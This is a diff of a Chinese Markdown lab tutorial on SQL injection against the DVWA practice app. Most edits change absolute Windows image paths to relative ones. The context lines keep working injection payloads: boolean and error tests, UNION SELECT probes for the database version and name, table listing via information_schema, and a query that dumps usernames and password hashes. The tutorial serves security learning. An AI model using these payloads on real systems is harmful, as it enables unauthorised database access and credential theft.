@@ -4,15 +4,15 @@
 
 第一步：判断是否存在漏洞
 
-​	1.基于报错的检测方法(输入：', 返回错误信息)
-
-​	2.基于布尔（真假）的检测(and or)
-
-​	3.基于UNION联合查询的检测
-
-​	4.基于时间的盲测的检测（时间函数sleep）
-
-​	5.基于叠对查询的检测（；）
+	1.基于报错的检测方法(输入：', 返回错误信息)
+	
+	2.基于布尔（真假）的检测(and or)
+	
+	3.基于UNION联合查询的检测
+	
+	4.基于时间的盲测的检测（时间函数sleep）
+	
+	5.基于叠对查询的检测（；）
 
 第二步：猜测后台查询语句
 
@@ -26,11 +26,11 @@
 
 ### 正常查询返回
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913163747050.png)
+![](./img/image-20240913163747050.png)
 
 ### 1.基于报错的检测方法
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913163914564.png)
+![](./img/image-20240913163914564.png)
 
 ### 2.基于布尔（真假）的检测(and or)
 
@@ -48,24 +48,24 @@
 1 and 1 = 1 
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164059882.png)
+![](./img/image-20240913163747050.png)
 
 ```sql
 1 and 1=2
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164645633.png)
+![](./img/image-20240913164645633.png)
 
 #### 判断字符类型
 
-简写
+简写  
 
 ```
 ' 
 "
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913165659978.png)
+![](./img/image-20240913165659978.png)
 
 
 
@@ -73,7 +73,7 @@
 1' and '1' = '1
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913165126172.png)
+![](./img/image-20240913165126172.png)
 
 
 
@@ -81,7 +81,7 @@
 1' and '1' = '2
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913164210216.png)
+![](./img/image-20240913164210216.png)
 
 
 
@@ -91,11 +91,11 @@
 'union select 1 #
 ```
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171502064.png)
+![](./img/image-20240913171502064.png)
 
 
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171535483.png)
+![](./img/image-20240913171535483.png)
 
 ### 4 基于时间的盲测的检测（时间函数sleep）
 
@@ -107,7 +107,7 @@
 
 
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913170117289.png)
+![](./img/image-20240913170117289.png)
 
 
 
@@ -164,7 +164,7 @@ user,password 这两个就是显示字段
 
 不存在报错
 
-![](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913173538996.png)
+![](./img/image-20240913173538996.png)
 
 存在
 
@@ -174,7 +174,7 @@ user,password 这两个就是显示字段
 
 
 
-![image-20240913173618350](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913173618350.png)
+![image-20240913173618350](./img/image-20240913173618350.png)
 
 #### 方法2：联合查询union
 
@@ -189,13 +189,13 @@ user,password 这两个就是显示字段
 
 存在完整显示字段（不报错）
 
-![image-20240913174613275](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174613275.png)
+![image-20240913174613275](./img/image-20240913174613275.png)
 
 
 
 不存在完整字段报错
 
-![image-20240913174656662](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174656662.png)
+![image-20240913174656662](./img/image-20240913174656662.png)
 
 
 
@@ -208,7 +208,7 @@ user,password 这两个就是显示字段
  1'union select 1, version()# 显示当前数据库版本
 ```
 
-![image-20240913174952550](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913174952550.png)
+![image-20240913174952550](./img/image-20240913174952550.png)
 
 
 
@@ -218,7 +218,7 @@ user,password 这两个就是显示字段
 1'union select 1, database()# 显示当前数据库名称
 ```
 
-![image-20240913175614927](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913175614927.png)
+![image-20240913175614927](./img/image-20240913175614927.png)
 
 
 
@@ -238,11 +238,11 @@ user,password 这两个就是显示字段
 
 需要指定数据库的字符类型
 
-![image-20240913171502064](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913171502064.png)
+![image-20240913171502064](./img/image-20240913171502064.png)
 
 
 
-![image-20240913181449385](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913181449385.png)
+![image-20240913181449385](./img/image-20240913181449385.png)
 
 #### 4.2.2获取源数据库的数据表名称
 
@@ -250,7 +250,7 @@ user,password 这两个就是显示字段
 1' union select 1, group_concat(table_name) from information_schema.tables#
 ```
 
-![image-20240913185621240](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913185621240.png)
+![image-20240913185621240](./img/image-20240913185621240.png)
 
 
 
@@ -279,7 +279,7 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
 
 
 
-![image-20240913182152912](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913182152912.png)
+![image-20240913182152912](./img/image-20240913182152912.png)
 
 
 
@@ -291,7 +291,7 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
 1' union select user,password from users#
 ```
 
-![image-20240913182928052](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913182928052.png)
+![image-20240913182928052](./img/image-20240913182928052.png)
 
 
 
@@ -304,4 +304,4 @@ user_id,first_name,last_name,user,password,avatar,last_login,failed_login
  不指定分隔符，默认位逗号分隔
 ```
 
-![image-20240913184803546](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\img\image-20240913184803546.png)
+![image-20240913184803546](./img/image-20240913184803546.png)
